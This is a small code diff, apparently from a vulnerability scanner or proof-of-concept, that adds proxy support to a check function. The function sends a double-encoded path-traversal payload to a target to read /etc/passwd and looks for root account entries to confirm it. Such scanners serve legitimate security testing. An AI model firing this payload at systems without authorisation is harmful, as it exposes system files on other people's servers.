@@ -26,7 +26,7 @@ def check(url, proxies=None):
     payload = "..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd%23foo/development"
     target_url = url + payload
     try:
-        res = requests.get(target_url, headers=DEFAULT_HEADER, timeout=TIMEOUT, verify=False)
+        res = requests.get(target_url, headers=DEFAULT_HEADER, timeout=TIMEOUT, verify=False, proxies=proxies)
         if res.status_code == 200:
             if r"x:0:0:root:/root:" in res.text and r"/sbin/nologin" in res.text and r"daemon" in res.text:
                 return True, {
